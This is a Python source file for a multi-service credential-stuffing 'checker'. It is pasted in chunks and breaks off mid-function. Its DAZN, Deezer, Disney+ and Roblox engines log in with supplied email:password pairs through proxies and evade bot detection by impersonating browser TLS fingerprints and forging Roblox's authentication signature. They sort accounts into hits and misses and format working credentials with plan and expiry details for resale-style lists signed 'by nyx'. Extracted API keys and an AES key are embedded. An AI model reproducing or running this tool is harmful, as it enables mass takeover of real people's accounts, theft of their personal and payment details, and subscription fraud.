DEEZER_API_KEY = "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE"
DEEZER_GATEWAY = "https://api.deezer.com/1.0/gateway.php"
DEEZER_UA      = "Deezer/8.0.50.5 (Android; 12; Mobile; us) samsung SM-G977N"
DEEZER_AES_KEY = bytes([0x56,0x42,0x4B,0x31,0x46,0x53,0x55,0x45,0x58,0x48,0x54,0x53,0x44,0x42,0x4A,0x4A])

DISNEY_SDK_KEY           = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
DISNEY_BASE_URL          = "https://disney.api.edge.bamgrid.com"
DISNEY_DEVICE_ENDPOINT   = f"{DISNEY_BASE_URL}/graph/v1/device/graphql"
DISNEY_GRAPHQL_ENDPOINT  = f"{DISNEY_BASE_URL}/v1/public/graphql"
DISNEY_SUBS_ENDPOINT     = f"{DISNEY_BASE_URL}/v2/subscribers"
DISNEY_X_APP_VERSION     = "c4b66d76"
DISNEY_X_SDK_CLIENT      = "disney-svod-3d9324fc"
DISNEY_X_SDK_PLATFORM    = "javascript/android/chrome"
DISNEY_X_SDK_VERSION     = "c4b66d76-disneyplus-nsx"
DISNEY_X_IDENTITY_CLIENT = "DTCI-DISNEYPLUS.WEB"

DISNEY_COUNTRY_NAMES = {
    "US":"United States","GB":"United Kingdom","CA":"Canada","AU":"Australia","DE":"Germany",
    "FR":"France","IT":"Italy","ES":"Spain","NL":"Netherlands","BR":"Brazil","MX":"Mexico",
    "JP":"Japan","KR":"South Korea","IN":"India","SG":"Singapore","SE":"Sweden","NO":"Norway",
    "DK":"Denmark","FI":"Finland","AT":"Austria","CH":"Switzerland","BE":"Belgium","IE":"Ireland",
    "NZ":"New Zealand","ZA":"South Africa","AR":"Argentina","CL":"Chile","CO":"Colombia",
    "PE":"Peru","AE":"UAE","SA":"Saudi Arabia","TR":"Turkey","PL":"Poland","CZ":"Czech Republic",
    "HU":"Hungary","RO":"Romania","GR":"Greece","PT":"Portugal","IL":"Israel","HK":"Hong Kong",
    "TW":"Taiwan","TH":"Thailand","MY":"Malaysia","PH":"Philippines","ID":"Indonesia",
    "VN":"Vietnam","RU":"Russia","UA":"Ukraine","CN":"China",
}

ROBLOX_IMPERSONATE = "chrome"
# ▼ CHUNK 1 END — PASTE CHUNK 2 BELOW THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DAZN ENGINE                                          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def _dazn_days(exp_str: str) -> int:
    if not exp_str:
        return 0
    try:
        s = exp_str[:-1] + "+00:00" if exp_str.endswith("Z") else exp_str
        return max(0, (datetime.fromisoformat(s) - datetime.now(timezone.utc)).days)
    except Exception:
        return 0


def dazn_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    try:
        from curl_cffi import requests as _cffi
    except Exception:
        return {"status": "ERROR", "reason": "curl_cffi_missing", "email": email, "password": password}

    device_id  = str(uuid.uuid4())
    session_id = str(uuid.uuid4())
    try:
        sess = _cffi.Session(impersonate="chrome110")
        if proxy:
            sess.proxies = {"http": proxy, "https": proxy}
    except Exception as e:
        return {"status": "ERROR", "reason": f"session_init:{str(e)[:40]}", "email": email, "password": password}

    try:
        login_headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Host": "authentication-prod.ar.indazn.com",
            "Origin": "https://tv.dazn.com",
            "Referer": "https://tv.dazn.com/",
            "User-Agent": ("Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 "
                           "(KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"),
            "x-brand": "dazn",
            "x-dazn-device": device_id,
            "X-Requested-With": "com.dazn",
        }
        r1 = sess.post(
            "https://authentication-prod.ar.indazn.com/v5/SignIn",
            json={"DeviceId": device_id, "Email": email, "Password": password, "Platform": "android"},
            headers=login_headers, timeout=REQUEST_TIMEOUT,
        )
        body = r1.text or ""
        low  = body.lower()
        if any(x in low for x in ("invalidpassword", "invalidemailformat", "accountblocked")):
            return {"status": "BAD", "reason": "invalid_credentials", "email": email, "password": password}
        if "token" not in low:
            return {"status": "BAD", "reason": "no_token", "email": email, "password": password}

        token_key = '"Token":"' if '"Token":"' in body else '"AuthToken":"'
        try:
            bearer = body.split(token_key)[1].split('"')[0]
        except Exception:
            return {"status": "BAD", "reason": "token_parse", "email": email, "password": password}

        web_hdrs = {
            "Authorization": f"Bearer {bearer}",
            "Origin": "https://www.dazn.com",
            "Referer": "https://www.dazn.com/",
            "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                           "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
            "Accept": "application/json, text/plain, */*",
            "x-brand": "dazn",
            "x-daznid": device_id,
            "x-session-id": session_id,
        }

        sub_data = {}
        try:
            r2 = sess.get("https://myaccount-bff.ar.indazn.com/v1/subscriptions",
                          headers=web_hdrs, timeout=REQUEST_TIMEOUT)
            if r2.status_code == 200:
                j2 = r2.json()
                subs = j2.get("Subscriptions", []) if isinstance(j2, dict) else (j2 if isinstance(j2, list) else [])
                if subs:
                    s0 = subs[0]
                    sub_data = {
                        "plan":     s0.get("PlanName", "Premium"),
                        "expiry":   s0.get("EndDate", ""),
                        "renewal":  s0.get("NextBillingDate", ""),
                        "country":  s0.get("Country", ""),
                        "is_trial": bool(s0.get("IsTrial", False)),
                        "partner":  s0.get("Partner", ""),
                        "source":   s0.get("Source", ""),
                    }
        except Exception:
            pass

        country = sub_data.get("country", "")
        if not country:
            try:
                rp = sess.get("https://user-profile.ar.indazn.com/v3/UserProfile",
                              headers=web_hdrs, timeout=REQUEST_TIMEOUT)
                if rp.status_code == 200:
                    jp = rp.json()
                    if isinstance(jp, dict):
                        country = jp.get("country", "") or country
            except Exception:
                pass

        if sub_data:
            days = _dazn_days(sub_data.get("expiry", ""))
            country_pretty = DAZN_COUNTRY_NAMES.get(str(country).upper(), country or "Unknown")
            content = (
                f"{email}:{password} | Plan={sub_data.get('plan','N/A')} | "
                f"Country={country_pretty} | Expiry={sub_data.get('expiry','N/A')} | "
                f"DaysLeft={days} | Trial={sub_data.get('is_trial')} | "
                f"Partner={sub_data.get('partner','N/A')} | by nyx"
            )
            return {
                "status":    "HIT",
                "email":     email,
                "password":  password,
                "plan":      sub_data.get("plan", "Premium"),
                "country":   country_pretty,
                "expiry":    sub_data.get("expiry", "N/A"),
                "renewal":   sub_data.get("renewal", "N/A"),
                "days_left": days,
                "is_trial":  sub_data.get("is_trial", False),
                "partner":   sub_data.get("partner", ""),
                "source":    sub_data.get("source", ""),
                "content":   content,
            }

        return {
            "status":   "FREE",
            "email":    email,
            "password": password,
            "country":  DAZN_COUNTRY_NAMES.get(str(country).upper(), country or "Unknown"),
            "reason":   "no_active_subscription",
        }

    except Exception as e:
        err = str(e)
        if any(x in err.lower() for x in ("timeout", "proxy", "connection", "ssl", "recv")):
            return {"status": "RETRY", "reason": err[:60], "email": email, "password": password}
        return {"status": "ERROR", "reason": err[:80], "email": email, "password": password}
    finally:
        try:
            sess.close()
        except Exception:
            pass
# ▼ CHUNK 2 END — PASTE CHUNK 3 BELOW THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DEEZER ENGINE                                        ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def _deezer_days(exp_str: str) -> int:
    if not exp_str:
        return 0
    try:
        d = datetime.strptime(exp_str[:10], "%Y-%m-%d").replace(tzinfo=timezone.utc)
        return max(0, (d - datetime.now(timezone.utc)).days)
    except Exception:
        return 0


def deezer_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    try:
        import httpx as _httpx
    except Exception:
        return {"status": "ERROR", "reason": "httpx_missing", "email": email, "password": password}

    try:
        client = _httpx.Client(
            timeout=REQUEST_TIMEOUT,
            headers={"User-Agent": DEEZER_UA},
            proxies={"http://": proxy, "https://": proxy} if proxy else None,
        )
    except Exception as e:
        return {"status": "ERROR", "reason": f"client_init:{str(e)[:40]}", "email": email, "password": password}

    try:
        r1 = client.get(DEEZER_GATEWAY, params={
            "api_key": DEEZER_API_KEY, "output": "3",
            "version": "8.0.50.5", "method": "mobile_auth",
        })
        try:
            token_hex = r1.json()["results"]["TOKEN"]
        except Exception:
            return {"status": "RETRY", "reason": "token_fetch", "email": email, "password": password}

        try:
            enc = binascii.unhexlify(token_hex)
            dec = _DZ_AES.new(DEEZER_AES_KEY, _DZ_AES.MODE_ECB).decrypt(enc).decode("utf-8", errors="ignore")
            token_string  = dec[:64]
            token_key     = dec[64:80].encode()
            user_info_key = dec[80:96].encode()
            auth_token = binascii.hexlify(
                _DZ_AES.new(token_key, _DZ_AES.MODE_ECB).encrypt(token_string.encode())
            ).decode()
        except Exception:
            return {"status": "RETRY", "reason": "token_decrypt", "email": email, "password": password}

        r2 = client.get(DEEZER_GATEWAY, params={
            "api_key": DEEZER_API_KEY, "output": "3",
            "method": "api_checkToken", "auth_token": auth_token,
        })
        try:
            sid = r2.json()["results"]
        except Exception:
            return {"status": "RETRY", "reason": "sid_fetch", "email": email, "password": password}

        r3 = client.post(DEEZER_GATEWAY, params={
            "api_key": DEEZER_API_KEY, "sid": sid,
            "method": "user_checkRegisterConstraints",
            "output": "3", "input": "3",
        }, content=json.dumps({"EMAIL": email}),
           headers={"Content-Type": "application/json"})

        try:
            reg = r3.json()
        except Exception:
            return {"status": "RETRY", "reason": "reg_json", "email": email, "password": password}

        if reg.get("error"):
            err = reg["error"]
            if isinstance(err, dict):
                code = err.get("code")
                msg  = err.get("message", "")
                if code in (4, 429) or "rate" in msg.lower() or "too many" in msg.lower():
                    return {"status": "RETRY", "reason": "rate_limit", "email": email, "password": password}
                return {"status": "ERROR", "reason": str(msg)[:60], "email": email, "password": password}
            return {"status": "ERROR", "reason": str(err)[:60], "email": email, "password": password}

        results = reg.get("results", {}) or {}
        errors_ = results.get("errors", {}) or {}
        used = (results.get("email_already_used")
                or (isinstance(errors_.get("email"), dict)
                    and errors_["email"].get("error") == "email_already_used")
                or ("email_already_used" in str(errors_)))
        if not used:
            return {"status": "BAD", "reason": "not_registered", "email": email, "password": password}

        pwd_hex = (binascii.hexlify(password.encode()).decode().lower() + "0" * 32)[:32]
        enc_pass = binascii.hexlify(
            _DZ_AES.new(user_info_key, _DZ_AES.MODE_ECB).encrypt(binascii.unhexlify(pwd_hex))
        ).decode()

        r4 = client.post(DEEZER_GATEWAY, params={
            "api_key": DEEZER_API_KEY, "method": "mobile_userAuth",
            "input": "3", "output": "3", "sid": sid,
        }, content=json.dumps({"mail": email, "password": enc_pass}),
           headers={"Content-Type": "application/json"})

        try:
            lr = r4.json()
        except Exception:
            return {"status": "RETRY", "reason": "login_json", "email": email, "password": password}

        if lr.get("error") and isinstance(lr["error"], dict) and lr["error"]:
            err  = lr["error"]
            code = err.get("code")
            msg  = err.get("message", "")
            if code in (4, 429) or "rate" in msg.lower() or "too many" in msg.lower():
                return {"status": "RETRY", "reason": "rate_limit", "email": email, "password": password}
            if "COUNTRY_CLOSED_FREEMIUM" in str(err):
                return {"status": "FREE", "reason": "country_blocked", "email": email, "password": password}
            if "bad-credentials" in str(err).lower():
                return {"status": "BAD", "reason": "invalid_credentials", "email": email, "password": password}
            return {"status": "ERROR", "reason": str(err)[:60], "email": email, "password": password}

        results = lr.get("results", {})
        if not results:
            return {"status": "ERROR", "reason": "empty_results", "email": email, "password": password}

        premium = results.get("PREMIUM", {}) or {}
        is_prem = premium.get("STATUS", 0) == 1
        offer   = premium.get("OFFER_NAME", "Deezer Free")
        expiry  = (premium.get("DATE_END") or "")[:10]
        country = results.get("COUNTRY", "")
        uname   = results.get("BLOG_NAME") or results.get("USER_NAME") or ""
        uid     = results.get("USER_ID", "")
        reg_dt  = (results.get("REGISTRATION_DATE") or "")[:10]
        ptype   = premium.get("TYPE", "")

        if is_prem:
            days = _deezer_days(expiry)
            content = (
                f"{email}:{password} | Offer={offer} | Expiry={expiry} | "
                f"Days={days} | Country={country} | Plan={ptype} | "
                f"User={uname} | UID={uid} | by nyx"
            )
            return {
                "status":    "PREMIUM",
                "email":     email,
                "password":  password,
                "offer":     offer,
                "expiry":    expiry,
                "days_left": days,
                "country":   country,
                "plan_type": ptype,
                "username":  uname,
                "user_id":   uid,
                "reg_date":  reg_dt,
                "content":   content,
            }

        return {
            "status":   "FREE",
            "email":    email,
            "password": password,
            "country":  country,
            "username": uname,
            "reg_date": reg_dt,
        }

    except Exception as e:
        err = str(e)
        if any(x in err.lower() for x in ("timeout", "proxy", "connection", "ssl")):
            return {"status": "RETRY", "reason": err[:60], "email": email, "password": password}
        return {"status": "ERROR", "reason": err[:80], "email": email, "password": password}
    finally:
        try:
            client.close()
        except Exception:
            pass
# ▼ CHUNK 3 END — PASTE CHUNK 4 BELOW THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DISNEY+ ENGINE                                       ║
# ╚══════════════════════════════════════════════════════════════════════════╝

_DISNEY_REGISTER_Q = """
mutation registerDevice($input: RegisterDeviceInput!) {
  registerDevice(registerDevice: $input) {
    grant { grantType assertion }
  }
}
"""

_DISNEY_CHECK_EMAIL_Q = """
query check($email: String!, $validateEmailOnOperations: ValidateEmailOnOperationsInput) {
  check(email: $email, validateEmailOnOperations: $validateEmailOnOperations) {
    operations
    nextOperation
    email { isValid validationFailureCodes suggestions { domain } }
  }
}
"""

_DISNEY_LOGIN_M = """
mutation login($input: LoginInput!) {
  login(login: $input) {
    actionGrant
    account { activeProfile { id } profiles { id attributes { isDefault parentalControls { isPinProtected } } } }
    activeSession { isSubscriber }
    identity { personalInfo { dateOfBirth gender } flows { personalInfo { requiresCollection eligibleForCollection } } }
  }
}
"""

_DISNEY_ME_Q = """
query me {
  me {
    account {
      activeProfile { id name }
      profiles { id name }
      attributes { email emailVerified locations { registration { geoIp { country } purchase { country } } } }
    }
    identity {
      email
      subscriber {
        subscriberStatus
        subscriptions {
          id
          state
          partner
          source { sourceProvider sourceType subType }
          product { name subscriptionPeriod earlyAccess trial { duration } categoryCodes }
          term { expiryDate nextRenewalDate isFreeTrial }
        }
      }
    }
  }
}
"""

_DISNEY_BASE_HEADERS = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type": "application/json",
    "Origin": "https://www.disneyplus.com",
    "Referer": "https://www.disneyplus.com/",
    "Sec-Ch-Ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?1",
    "Sec-Ch-Ua-Platform": '"Android"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "User-Agent": ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
    "X-Application-Version": DISNEY_X_APP_VERSION,
    "X-Bamsdk-Client-Id": DISNEY_X_SDK_CLIENT,
    "X-Bamsdk-Platform": DISNEY_X_SDK_PLATFORM,
    "X-Bamsdk-Platform-Id": "browser",
    "X-Bamsdk-Version": DISNEY_X_SDK_VERSION,
    "X-Bamtech-Wpnx-Mlp-Identifier": "/",
    "X-Bamtech-Wpnx-Mlp-Locale": "en-us",
    "X-Disney-Identity-Client-Id": DISNEY_X_IDENTITY_CLIENT,
}


def _disney_headers(auth_token=None, request_id=None) -> Dict[str, str]:
    h = dict(_DISNEY_BASE_HEADERS)
    if auth_token:
        h["Authorization"] = f"Bearer {auth_token}"
    if request_id:
        h["X-Request-ID"] = request_id
        h["X-BAMSDK-Transaction-ID"] = request_id
    return h


def _disney_spawn_device(sess) -> Optional[str]:
    request_id = str(uuid.uuid4())
    payload = {
        "operationName": "registerDevice",
        "query": _DISNEY_REGISTER_Q,
        "variables": {
            "input": {
                "deviceFamily": "browser",
                "applicationRuntime": "chrome",
                "deviceProfile": "browser",
                "deviceLanguage": "en",
                "devicePlatformId": "browser",
                "attributes": {
                    "brand": "web",
                    "browserName": "chrome",
                    "browserVersion": "139.0.0.0",
                    "manufacturer": "n/a",
                    "model": None,
                    "operatingSystem": "android",
                    "operatingSystemVersion": "10.0",
                    "osDeviceIds": [],
                },
            }
        },
    }
    try:
        r = sess.post(
            DISNEY_DEVICE_ENDPOINT,
            headers=_disney_headers(auth_token=DISNEY_SDK_KEY, request_id=request_id),
            json=payload, timeout=REQUEST_TIMEOUT,
        )
        if r.status_code != 200:
            return None
        j = r.json()
        return j.get("extensions", {}).get("sdk", {}).get("token", {}).get("accessToken")
    except Exception:
        return None


def _disney_verify_email(sess, device_token: str, email: str) -> bool:
    request_id = str(uuid.uuid4())
    payload = {
        "operationName": "check",
        "query": _DISNEY_CHECK_EMAIL_Q,
        "variables": {
            "email": email,
            "validateEmailOnOperations": {"operations": ["Register"]},
        },
    }
    try:
        r = sess.post(
            DISNEY_GRAPHQL_ENDPOINT,
            headers=_disney_headers(auth_token=device_token, request_id=request_id),
            json=payload, timeout=REQUEST_TIMEOUT,
        )
        if r.status_code != 200:
            return False
        j = r.json()
        if j.get("errors"):
            return False
        ops = j.get("data", {}).get("check", {}).get("operations", [])
        if not ops:
            return False
        return ops != ["Register"]
    except Exception:
        return False


def _disney_login(sess, device_token: str, email: str, password: str) -> Tuple[Optional[str], bool, str, Optional[str]]:
    request_id = str(uuid.uuid4())
    payload = {
        "operationName": "login",
        "query": _DISNEY_LOGIN_M,
        "variables": {"input": {"email": email, "password": password}},
    }
    try:
        r = sess.post(
            DISNEY_GRAPHQL_ENDPOINT,
            headers=_disney_headers(auth_token=device_token, request_id=request_id),
            json=payload, timeout=REQUEST_TIMEOUT,
        )
    except Exception:
        return None, False, "", "network_error"

    if r.status_code != 200:
        return None, False, "", f"http_{r.status_code}"

    try:
        j = r.json()
    except Exception:
        return None, False, "", "invalid_json"

    if j.get("errors"):
        code = j["errors"][0].get("extensions", {}).get("code", "unknown_error")
        return None, False, "", code

    try:
        utok = j.get("extensions", {}).get("sdk", {}).get("token", {}).get("accessToken")
        is_sub = j.get("data", {}).get("login", {}).get("activeSession", {}).get("isSubscriber", False)
        country = j.get("extensions", {}).get("sdk", {}).get("session", {}).get("location", {}).get("countryCode", "")
    except Exception:
        return None, False, "", "extraction_error"
    return utok, is_sub, country, None


def _disney_fetch_me(sess, user_token: str) -> Dict:
    try:
        r = sess.post(
            DISNEY_GRAPHQL_ENDPOINT,
            headers=_disney_headers(auth_token=user_token, request_id=str(uuid.uuid4())),
            json={"query": _DISNEY_ME_Q},
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code != 200:
            return {}
        j = r.json()
        if not isinstance(j, dict):
            return {}
        return j.get("data", {}).get("me", {}) or {}
    except Exception:
        return {}


def _disney_get_subs(sess, user_token: str) -> Dict:
    try:
        r = sess.get(
            DISNEY_SUBS_ENDPOINT,
            headers=_disney_headers(auth_token=user_token, request_id=str(uuid.uuid4())),
            timeout=REQUEST_TIMEOUT,
        )
    except Exception:
        return {"is_active": False, "error": "network"}
    if r.status_code != 200:
        return {"is_active": False, "error": f"http_{r.status_code}"}
    try:
        data = r.json()
    except Exception:
        return {"is_active": False, "error": "invalid_json"}
    if not isinstance(data, list) or not data:
        return {"is_active": False, "plan": "None"}
    sub = data[0]
    return {
        "is_active":   sub.get("subscriberStatus") == "ACTIVE",
        "plan":        sub.get("product", {}).get("name", "Unknown"),
        "period":      sub.get("product", {}).get("subscriptionPeriod", "N/A"),
        "is_free":     sub.get("term", {}).get("isFreeTrial", False),
        "next_renewal": (sub.get("term", {}).get("nextRenewalDate") or "")[:10],
    }


def _disney_days(exp_str: str) -> int:
    if not exp_str:
        return 0
    try:
        s = exp_str[:-1] + "+00:00" if exp_str.endswith("Z") else exp_str
        return max(0, (datetime.fromisoformat(s) - datetime.now(timezone.utc)).days)
    except Exception:
        return 0


def disney_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    try:
        from curl_cffi import requests as _cffi
    except Exception:
        return {"status": "ERROR", "reason": "curl_cffi_missing", "email": email, "password": password}

    try:
        sess = _cffi.Session(impersonate="chrome131_android")
        if proxy:
            sess.proxies = {"http": proxy, "https": proxy}
    except Exception as e:
        return {"status": "ERROR", "reason": f"session_init:{str(e)[:40]}", "email": email, "password": password}

    try:
        device_token = _disney_spawn_device(sess)
        if not device_token:
            return {"status": "RETRY", "reason": "device_reg_failed", "email": email, "password": password}

        if not _disney_verify_email(sess, device_token, email):
            return {"status": "BAD", "reason": "email_not_registered", "email": email, "password": password}

        user_token, is_sub, country, err_code = _disney_login(sess, device_token, email, password)
        if err_code:
            err_map = {
                "idp.error.identity.bad-credentials":          ("BAD",   "wrong_password"),
                "idp.error.identity.password-reset-required":  ("CUSTOM","password_reset_required"),
                "idp.error.identity.account-disabled":         ("BAD",   "account_disabled"),
                "idp.error.identity.identity-blocked":         ("BAD",   "identity_blocked"),
                "idp.error.identity.otp-required":             ("CUSTOM","2fa_required"),
                "rate-limit":                                  ("RETRY", "rate_limit"),
                "too-many-requests":                           ("RETRY", "too_many_requests"),
                "network_error":                               ("RETRY", "network_error"),
            }
            status, msg = err_map.get(err_code, ("CUSTOM", f"error:{err_code}"))
            return {"status": status, "reason": msg, "email": email, "password": password}

        if not user_token:
            return {"status": "BAD", "reason": "login_failed", "email": email, "password": password}

        me = _disney_fetch_me(sess, user_token)
        plan = ""
        expiry = ""
        renewal = ""
        is_trial = False
        partner = ""
        source = ""
        period = ""
        early_access = False
        profile_names: List[str] = []
        email_verified = False

        if me:
            acct = me.get("account", {}) or {}
            email_verified = bool((acct.get("attributes") or {}).get("emailVerified"))
            for p in acct.get("profiles", []) or []:
                if p.get("name"):
                    profile_names.append(p["name"])
            ident = me.get("identity", {}) or {}
            subs = (ident.get("subscriber") or {}).get("subscriptions", []) or []
            if subs:
                s0 = subs[0]
                plan = (s0.get("product") or {}).get("name", "") or plan
                period = (s0.get("product") or {}).get("subscriptionPeriod", "") or period
                expiry = ((s0.get("term") or {}).get("expiryDate") or "")[:10]
                renewal = ((s0.get("term") or {}).get("nextRenewalDate") or "")[:10]
                is_trial = bool((s0.get("term") or {}).get("isFreeTrial"))
                partner = s0.get("partner", "") or ""
                source = (s0.get("source") or {}).get("sourceProvider", "") or ""
                early_access = bool((s0.get("product") or {}).get("earlyAccess"))

        subs_info = _disney_get_subs(sess, user_token)
        country_pretty = DISNEY_COUNTRY_NAMES.get(str(country).upper(), country or "Unknown")

        if subs_info.get("is_active"):
            plan = subs_info.get("plan", plan) or "Premium"
            renewal = subs_info.get("next_renewal", renewal) or renewal
            days = _disney_days(expiry)
            content = (
                f"{email}:{password} | Plan={plan} | Country={country_pretty} | "
                f"Expiry={expiry or 'N/A'} | DaysLeft={days} | "
                f"Status={subs_info.get('is_active')} | Profiles={','.join(profile_names) or 'N/A'} | "
                f"Partner={partner or 'N/A'} | Source={source or 'N/A'} | "
                f"Period={period or 'N/A'} | Renewal={renewal or 'N/A'} | "
                f"Trial={is_trial} | EmailVerified={email_verified} | EarlyAccess={early_access} | by nyx"
            )
            return {
                "status":         "HIT",
                "email":          email,
                "password":       password,
                "plan":           plan,
                "country":        country_pretty,
                "expiry":         expiry or "N/A",
                "renewal":        renewal or "N/A",
                "days_left":      days,
                "is_trial":       is_trial,
                "partner":        partner,
                "source":         source,
                "period":         period,
                "early_access":   early_access,
                "email_verified": email_verified,
                "profiles":       profile_names,
                "content":        content,
            }

        return {
            "status":   "FREE",
            "email":    email,
            "password": password,
            "country":  country_pretty,
            "plan":     subs_info.get("plan", "None"),
            "reason":   "no_active_subscription",
        }

    except Exception as e:
        err = str(e)
        if any(x in err.lower() for x in ("timeout", "proxy", "connection", "ssl", "recv")):
            return {"status": "RETRY", "reason": err[:60], "email": email, "password": password}
        return {"status": "ERROR", "reason": err[:80], "email": email, "password": password}
    finally:
        try:
            sess.close()
        except Exception:
            pass
# ▼ CHUNK 4 END — PASTE CHUNK 5 BELOW THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    ROBLOX ENGINE                                        ║
# ╚══════════════════════════════════════════════════════════════════════════╝

try:
    from cryptography.hazmat.primitives.asymmetric import ec as _rbx_ec
    from cryptography.hazmat.primitives import hashes as _rbx_hashes, serialization as _rbx_ser
    from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature as _rbx_parse_sig
    _RBX_CRYPTO_OK = True
except Exception:
    _RBX_CRYPTO_OK = False


class _RobloxChecker:
    """Roblox account validator — async, curl_cffi AsyncSession, no TUI."""

    def __init__(self, proxy: Optional[str] = None, timeout: int = 20):
        self.proxy = proxy
        self.timeout = timeout
        self.session = None
        self.csrf = None

    def _proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    def _headers(self, referer="https://www.roblox.com/", content_type=None):
        h = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "origin": "https://www.roblox.com",
            "referer": referer,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
        }
        if content_type:
            h["content-type"] = content_type
        if self.csrf:
            h["x-csrf-token"] = self.csrf
        return h

    async def _ensure(self):
        if self.session is None:
            from curl_cffi.requests import AsyncSession
            self.session = AsyncSession(impersonate=ROBLOX_IMPERSONATE)

    async def _close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    async def _warm(self):
        for url in ("https://www.roblox.com/", "https://www.roblox.com/Login"):
            try:
                await self.session.get(
                    url,
                    headers={
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "accept-language": "en-US,en;q=0.9",
                        "upgrade-insecure-requests": "1",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none",
                    },
                    proxies=self._proxies(),
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
            except Exception:
                pass

    async def _fetch_csrf(self) -> Optional[str]:
        try:
            r = await self.session.post(
                "https://auth.roblox.com/v2/logout",
                headers=self._headers(), proxies=self._proxies(),
                timeout=self.timeout, verify=False,
            )
            tok = r.headers.get("x-csrf-token")
            if tok:
                self.csrf = tok
                return tok
        except Exception:
            pass
        try:
            r = await self.session.post(
                "https://apis.roblox.com/rotating-client-service/v1/register",
                headers={
                    "accept": "application/json, text/plain, */*",
                    "content-type": "application/json-patch+json",
                    "origin": "https://www.roblox.com",
                    "referer": "https://www.roblox.com/",
                },
                data=json.dumps({"identifier": str(uuid.uuid4()), "key": "x"}),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
            tok = r.headers.get("x-csrf-token")
            if tok:
                self.csrf = tok
                return tok
        except Exception:
            pass
        return None

    async def _sign_sai(self) -> Optional[Dict]:
        if not _RBX_CRYPTO_OK:
            return None
        try:
            priv = _rbx_ec.generate_private_key(_rbx_ec.SECP256R1())
            pub_der = priv.public_key().public_bytes(
                encoding=_rbx_ser.Encoding.DER,
                format=_rbx_ser.PublicFormat.SubjectPublicKeyInfo,
            )
            pub_b64 = base64.b64encode(pub_der).decode()
        except Exception:
            return None

        try:
            r = await self.session.get(
                "https://apis.roblox.com/hba-service/v1/getServerNonce?urlLocale=en_us",
                headers=self._headers(content_type="application/json"),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
        except Exception:
            return None
        if r.status_code != 200:
            return None
        try:
            j = r.json()
        except Exception:
            return None

        nonce = j if isinstance(j, str) else None
        if isinstance(j, dict):
            for k in ("nonce", "serverNonce", "server_nonce"):
                if j.get(k):
                    nonce = j[k]
                    break
        if not nonce:
            return None

        ts = int(time.time())
        payload = f"{pub_b64}|{ts}|{nonce}".encode()
        try:
            der = priv.sign(payload, _rbx_ec.ECDSA(_rbx_hashes.SHA256()))
            r_int, s_int = _rbx_parse_sig(der)
            raw = r_int.to_bytes(32, "big") + s_int.to_bytes(32, "big")
            sig_b64 = base64.b64encode(raw).decode()
        except Exception:
            return None

        return {
            "clientPublicKey":     pub_b64,
            "clientEpochTimestamp": ts,
            "serverNonce":         nonce,
            "saiSignature":        sig_b64,
        }

    async def _post_login(self, username: str, password: str, sai: Optional[Dict] = None):
        body = {"ctype": "Username", "cvalue": username, "password": password}
        if sai:
            body["secureAuthenticationIntent"] = sai
        try:
            r = await self.session.post(
                "https://auth.roblox.com/v2/login?urlLocale=en_us",
                headers=self._headers(content_type="application/json;charset=UTF-8"),
                data=json.dumps(body),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
            return r, None
        except Exception as e:
            return None, f"network:{type(e).__name__}"

    async def _pull(self, url: str):
        try:
            r = await self.session.get(
                url, headers=self._headers("https://www.roblox.com/"),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
        except Exception:
            return None
        if r.status_code != 200:
            return None
        try:
            return r.json()
        except Exception:
            return None

    async def _enrich(self, uid: int, username: str, display: str) -> Dict:
        (robux_r, premium_r, prem_det_r, country_r, bday_r, age_r, credit_r,
         user_info_r, badges_r, games_r, hats_r, bundles_r, rbx_badges_r, payments_r) = await asyncio.gather(
            self._pull(f"https://economy.roblox.com/v1/users/{uid}/currency"),
            self._pull(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership"),
            self._pull(f"https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions/details"),
            self._pull("https://accountsettings.roblox.com/v1/account/settings/account-country"),
            self._pull("https://users.roblox.com/v1/birthdate"),
            self._pull("https://apis.roblox.com/user-settings-api/v1/account-insights/age-group"),
